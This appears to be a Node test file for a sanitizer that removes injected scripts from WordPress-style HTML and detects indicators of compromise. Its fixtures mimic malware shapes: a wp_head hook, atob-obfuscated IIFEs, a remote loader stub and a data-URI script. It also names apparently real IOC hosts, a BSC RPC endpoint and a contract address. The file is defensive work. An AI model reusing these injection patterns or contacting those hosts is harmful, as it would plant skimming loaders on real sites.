// Run: node --test test/
// Synthetic fixtures only (short fake base64) — never real payloads.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { sanitize, sanitizeContent, findIocs, defang, IOC_PATTERNS } from '../lib/sanitize.mjs';

const B64 = 'QUJD'.repeat(60);
const NESTED_XDAV = `<script>function xdav_tracker() {\n ?>\n<script>\n!function(){var _0x50ad=atob('${B64}'),_0xd5d6=99;}();\n</script><br />\n <?php\n}\nadd_action( 'wp_head', 'xdav_tracker', 96 );</script>`;

const cases = [
  ['nested xdav_tracker block (inner </script> before add_action)', `<p>A</p>${NESTED_XDAV}<p>B</p>`, '<p>A</p><p>B</p>', 'xdav_block'],
  ['uppercase + attributes on obfuscated IIFE', `<p>A</p><SCRIPT type="text/javascript">;!function(){var _0x1234=atob('${B64}')}()</SCRIPT><p>B</p>`, '<p>A</p><p>B</p>', 'obfuscated_iife'],
  ['loader stub spanning wpautop </p><p>', `<p>A</p><script>;const script = document.createElement('script');\nscript.src = 'https://x.invalid/lom/api';</p>\n<p>document.head.appendChild(script);</script><p>B</p>`, '<p>A</p><p>B</p>', 'loader_stub'],
  ['data-URI script, id after src', `<p>A</p><script src="data:text/javascript;base64,${B64}" id="_ea_s"></script><p>B</p>`, '<p>A</p><p>B</p>', 'data_uri_script'],
  ['javascript-obfuscator variant', `<p>A</p><script>; (function (_0x42cc1) { var _0xa05d3 = 6869; })()</script><p>B</p>`, '<p>A</p><p>B</p>', 'obfuscated_fn'],
  ['output trailer on JSON', `{"a":1}<!-- BEGIN: X Secure Pixel Stream -->\n<script>window.XTracker_TYKW={}</script><script>!function(){var _0x8105=atob('${B64}')}()</script>\n<!-- END: X Secure Pixel Stream -->`, '{"a":1}', 'trailer_block'],
];

for (const [name, input, expected, rule] of cases) {
  test(`removes: ${name}`, () => {
    const r = sanitize(input);
    assert.equal(r.clean, expected);
    assert.ok(r.removed[rule] >= 1, `rule ${rule} should fire`);
    assert.deepEqual(r.residualIocs, []);
  });
}

test('never swallows legitimate text between an unclosed payload and a later script', () => {
  const r = sanitize('<p>A</p><script>;!function(){var _0xabcd=1}</p><p>LEGIT TEXT</p><script>var x=1;</script>');
  assert.match(r.clean, /LEGIT TEXT/);
});

test('leaves clean Malayalam content (incl. ZWJ) untouched', () => {
  const html = '<p>ഇസ്ലാം നൂറ്റാണ്ടുകള്&#x200d;ക്ക് മുമ്പേ</p><p><a href="/2407/">link</a></p>';
  const r = sanitize(html);
  assert.equal(r.clean, html);
  assert.deepEqual(r.removed, {});
});

test('sanitizeContent drops every script and an unclosed trailing <script', () => {
  assert.equal(sanitizeContent('<p>A</p><script>var a=1;</script><p>B</p>').clean, '<p>A</p><p>B</p>');
  assert.equal(sanitizeContent('<p>A</p><script>var a=1; <p>rest').clean, '<p>A</p>');
});

test('IOC detection tolerates obfuscation tricks', () => {
  assert.ok(findIocs('eval /*x*/ (atob(y))').includes('eval_atob'));
  assert.ok(findIocs('x = eth_call').includes('rpc_call'));
  assert.ok(findIocs('<script id=_ea_s src=x>').includes('ea_s_script'));
  assert.deepEqual(findIocs('<p>ordinary article text</p>'), []);
});

test('IOC and removal-rule ids never trip the scanner (they are stored in evidence)', () => {
  const ids = [...IOC_PATTERNS.map((p) => p.id), 'trailer_block', 'xdav_block', 'loader_stub', 'obfuscated_iife', 'obfuscated_fn', 'xtracker_stub', 'data_uri_script', 'other_script'];
  assert.deepEqual(findIocs(JSON.stringify({ _responseHadIocs: ids, removed: ids })), []);
});

test('defang makes stored evidence inert (passes the fail-closed writer)', () => {
  const raw = 'https://interseq.at/lom/api eth_call https://bsc-testnet-rpc.publicnode.com/ 0xA1decFB75C8C0CA28C10517ce56B710baf727d2e';
  assert.ok(findIocs(raw).length >= 3);
  assert.deepEqual(findIocs(defang(raw)), []);
});
